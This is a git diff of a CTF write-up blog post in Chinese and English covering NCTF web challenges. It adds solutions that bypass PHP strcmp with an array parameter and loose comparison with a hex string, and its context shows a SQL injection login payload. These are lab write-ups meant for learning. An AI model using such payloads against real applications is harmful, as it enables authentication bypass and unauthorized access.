@@ -9,7 +9,7 @@ date:   2020-03-21 13:15:38 +0800
 点开题目右键检查元素可以找到在a标签里面display属性为none的文本。
 
 ## [md5 collision](http://chinalover.sinaapp.com/web19/)
-
+源代码要求两个输入的md5一致。
 ```php
 # Source
 $md51 = md5('QNKCDZO');
@@ -166,7 +166,7 @@ curl http://chinalover.sinaapp.com/web11/sql.php?id=1024.1
 - `intval` in php
 
 ## [/x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)
-
+源代码要求1. 正则表达式开头到结尾只能包含1-9 2.同时包含`#biubiubiu`
 ```php
 # Source
 if (isset ($_GET['nctf'])) {
@@ -278,6 +278,64 @@ curl http://chinalover.sinaapp.com/index.php -X POST -d 'user=admin%27%29+--+k&p
 
 - [comments in MySQL](https://stackoverflow.com/a/14436098/8706476): `--` followed by space characters
   - append additional characters in case of `trim`
+
+## [pass check](http://chinalover.sinaapp.com/web21/)
+```php
+# Source
+$pass=@$_POST['pass'];
+$pass1=***********;//被隐藏起来的密码
+if(isset($pass))
+{
+  if(@!strcmp($pass,$pass1)){
+    echo "flag:nctf{*}";
+  }else{
+    echo "the pass is wrong!";
+  }
+}else{
+  echo "please input pass!";
+}
+```
+
+```shell
+curl http://chinalover.sinaapp.com/web21/ -X POST -d 'pass[]='
+```
+### Notes
+- `strcmp` reports a warning and returns nothing when given an array
+- POST array with [`curl`](https://stackoverflow.com/a/22741771/8706476)
+
+## [起名字真难](http://chinalover.sinaapp.com/web12/index.php)
+源代码要求1. 输入不是1-9；2.等于54975581388
+
+```php
+function noother_says_correct($number)
+{
+       $one = ord('1');
+       $nine = ord('9');
+       for ($i = 0; $i < strlen($number); $i++)
+       {   
+               $digit = ord($number{$i});
+               if ( ($digit >= $one) && ($digit <= $nine) )
+               {
+                       return false;
+               }
+       }
+          return $number == '54975581388';
+}
+$flag='*******';
+if(noother_says_correct($_GET['key']))
+   echo $flag;
+else 
+   echo 'access denied';
+```
+
+可以留意到比较范围是1-9，少了0，可能是因为答案需要十六进制前缀0x的关系；刚好54975581388的16进制没有1-9。
+
+```shell
+curl http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc
+```
+### Notes
+- php [loosely equal comparison](https://stackoverflow.com/a/80649/8706476): cast hex string to integer
+
 
 ## [SQL注入2](http://4.chinalover.sinaapp.com/web6/index.php)
 
